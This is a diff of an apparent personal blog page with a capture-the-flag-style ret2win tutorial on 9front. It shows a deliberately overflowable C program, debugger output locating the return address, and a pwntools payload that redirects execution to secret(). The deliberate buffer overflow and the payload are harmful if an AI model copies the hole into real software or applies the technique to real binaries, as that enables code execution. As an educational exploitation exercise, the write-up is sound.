@@ -3,12 +3,157 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TR/home</title>
+    <title>TR/9pwn/ret2win</title>
     <link rel="stylesheet" href="../style.css">
 </head>
 <body>
-		<h3>9pwn/Ret2Win: simple ret2win in 9front (for AMD64)</h3>
-		<p>I'm gonna assume that you know what a ret2win is: poisoning the return address to change the program execution
-		but this writeup will explain how to write and compile a simple C program and how to use 9front's debugger acid.<p>
+		<h1>9pwn/Ret2Win: simple ret2win in 9front</h1>
+		<h3>NOTE: this writeup is for AMD64 </h3>
+		<p>I'm gonna assume that you know what a ret2win is: poisoning the return address to change the program's execution.
+			In this writeup I will explain how to write and compile a simple C program and how to use 9front's debugger "acid"
+			to get what we want.</p><b>
+		<h2>Writing the vulnerable program </h2>
+			<pre><code>#include &lt;u.h>
+#include &lt;libc.h>
+
+void secret(void)
+{
+    print("you win\n");
+}
+
+void vulnerable(void)
+{
+    char buf[32];
+    read(0, buf, 256);
+}
+
+void main(void)
+{
+    vulnerable();
+    print("nothing happened\n");
+}</code></pre>
+			<p>So we are using u.h and libc.h instead of stdio.h like we normally would...and we are using print() instead of printf() because 9front's C compiler and C library are a different from musl/glibc. print() is also different than printf() but honestly I did not bother looking up the differences (as of right now).</p> 
+<h2>Compiling (and linking) the vulnerable program</h3>
+<p>The compiler we will use is 6c, which compiles for AMD64 architecture. For i386 we have 8c, for ARM32 there is 5c, for MIPS little endian we have 0c etc.
+				<b> </p>
+			<p>Similarly, the linker we will use is 6l.</p>
+			<p>The following creates a file bof.6:</p>
+		<pre><code>6c bof.c</code></pre>
+			<p>To link bof.6 (where ./bof is the output file):</p>
+		<pre><code>6l -o bof bof.6</code></pre>
+			<p>Now you hopefully have a working program that you can run:</p>
+			<pre><code>cirno# 6c bof.c
+cirno# 6l -o bof bof.6
+cirno# ./bof
+faaaaah
+nothing happened
+cirno#</code></pre>
+<h2>Using acid to debug</h2>
+<p>Not a great debugger, especialy if you are used to gdb but it works. Will get this job done, but first:</p>
+						<pre><code>man acid</code></pre>
+						<p>Just have a look at it so you know what you're getting into. Then fire up acid:</p>
+						<pre><code>acid ./bof</code></pre>
+						<p>You should see something like this:</p>
+						<pre><code>./bof:amd64 plan 9 executable
+/sys/lib/acid/port
+/sys/lib/acid/amd64
+acid:</code></pre>
+						<p>You can use asm() to disassemble the program.  Since we already know the function names we do this:</p>
+<pre><code>acid: asm(vulnerable)
+vulnerable 0x000000000020003b	SUBQ	$0x48,SP
+vulnerable+0x4 0x000000000020003f	XORL	BP,BP
+vulnerable+0x6 0x0000000000200041	LEAQ	buf+0x28(SP),DI
+vulnerable+0xb 0x0000000000200046	MOVQ	DI,0x8(SP)
+vulnerable+0x10 0x000000000020004b	MOVL	$0x100,DI
+vulnerable+0x15 0x0000000000200050	MOVL	DI,0x10(SP)
+vulnerable+0x19 0x0000000000200054	CALL	read(SB)
+vulnerable+0x1e 0x0000000000200059	ADDQ	$0x48,SP
+vulnerable+0x22 0x000000000020005d	RET
+acid: asm(secret)
+secret 0x0000000000200028	SUBQ	$0x10,SP
+secret+0x4 0x000000000020002c	MOVL	$.string(SB),BP
+secret+0x9 0x0000000000200031	CALL	print(SB)
+secret+0xe 0x0000000000200036	ADDQ	$0x10,SP
+secret+0x12 0x000000000020003a	RET
+acid:
+</code></pre>
+						<p>And secret() is where we wanna direct our execution to, so now we know that it lives
+						at 0x0000000000200028</p>
+						<p>But wait what if we do not know the function names? 
+						What if the binary is stripped? Well then my friend you wait for anoter blog of mine
+						where I have figured this out, or you figure it out for yourself.</p>
+						<p>Now let us set a break point at our read function, but first we need to start acid (don't ask me why!).
+						Run the new() command</p>
+						<pre><code>acid: new()
+689: system call	_main	MOVQ	AX,_tos(SB)
+689: breakpoint	main+0x4	CALL	vulnerable(SB)
+acid:</code></pre>
+<p>Now set a breakpoint at the read(SB) call</p>
+<pre><code>acid: bpset(vulnerable+0x19)</code></pre>
+<p>Now do cont() to continue</p>
+<pre><code>acid: cont()
+689: breakpoint	vulnerable+0x19	CALL	read(SB)</code></pre>
+<h2>Finding the location of return address</h2>
+9front passes arguments on the stack, and 9front does not follow the System V ABI so no arguments in registers. So, in the vulnerable()  function:
+<pre><code>SUBQ	$0x48,SP // allocate stack frame
+XORL	BP,BP // zero out the base pointer, idk why probably to set the file descriptor = 0 somehow?
+LEAQ	buf+0x28(SP),DI // load address of buffer (SP+0x28) in to DI
+MOVQ	DI,0x8(SP) // second argument, put *buf at SP+0x8
+MOVL	$0x100,DI // load 256 bytes into DI
+MOVL	DI,0x10(SP) // 3rd argument, put 0x100 or 256 at SP+0x10
+CALL	read(SB)
+ADDQ	$0x48,SP
+RET
+</code></pre>
+<p>So since we know that our payload will end up at SP+0x28, let's dump that memory area, after you have sent a few
+As in the input (which will show up as 0x414141...)</p>
+<pre><code>dump(*SP+0x28, 20, "X")</code></pre>
+<p>Look at the memory output, count the 0x41s you sent (in this example, I sent 10) to see if our math is corect.
+Also look at all the values.</p>
+<p>From my observation it seems like 0xfefefefe is the uninitialized memory. But can you spot something else? Okay here we go:
+</p>
+<pre><code>0x00007fffffffeea8: 0x41414141
+0x00007fffffffeeac: 0x41414141
+0x00007fffffffeeb0: 0xfe0a4141 // 10 * A
+0x00007fffffffeeb4: 0xfefefefe
+0x00007fffffffeeb8: 0xfefefefe
+0x00007fffffffeebc: 0xfefefefe
+0x00007fffffffeec0: 0xfefefefe
+0x00007fffffffeec4: 0xfefefefe
+0x00007fffffffeec8: 0x00200067 // this is it.
+0x00007fffffffeecc: 0x00000000
+0x00007fffffffeed0: 0xfefefefe
+</code></pre>
+<p>So in the example I compiled, 0x00200067 is in main()</p>
+						<pre><code>acid: asm(main)
+main 0x000000000020005e	SUBQ	$0x10,SP
+main+0x4 0x0000000000200062	CALL	vulnerable(SB)
+main+0x9 0x0000000000200067	MOVL	$.string+0x9(SB),BP // instruction to return to
+main+0xe 0x000000000020006c	CALL	print(SB)
+main+0x13 0x0000000000200071	ADDQ	$0x10,SP
+main+0x17 0x0000000000200075	RET</code></pre>
+<p>Good game babes, now we just do some math</p>
+<pre><code>>>> 0x00007fffffffeec8 - 0x00007fffffffeea8
+32</code></pre>
+<p>Now it's all easy peasy, we know the address of our secret(): 0x200028, and we know the offset of the return address.
+Since there is no canary, PIE or ASLR, there is no one that can stop us.</p>
+<h2>Writing an exploit for the pwn</h2>
+<p>I am a lazy human, so I just used pwntools. The program below creates 32 As and then appends return address of secret()</p>
+<pre><code>from pwn import *
+payload = b'A' * 32 + p64(0x200028)
+with open('input.bin', 'wb') as payload_file:
+    payload_file.write(payload)</code></pre>
+<p>Make sure the return address is 64 bit and little endian.</p>
+<p>Then I sent it over using an http server because I am lazy to configure file sharing between 9front and Linux.</p>
+
+<pre><code>cirno# cat input.bin  | ./bof
+you win
+bof 835: suicide: sys: trap: general protection violation pc=0x20003a
+cirno#</code></pre>
+
+<h2>Conclusion</h2>
+<p>I didn't manage to do this in one go, setting up 9front was painful and using acid was even more painful.
+Honestly I just looked at the memory dump, found the return address and overwrote it - only for this blog I did
+all the research for the argument passing and yada yada. Have fun, keep pwning.</p>
 </body>
 </html>
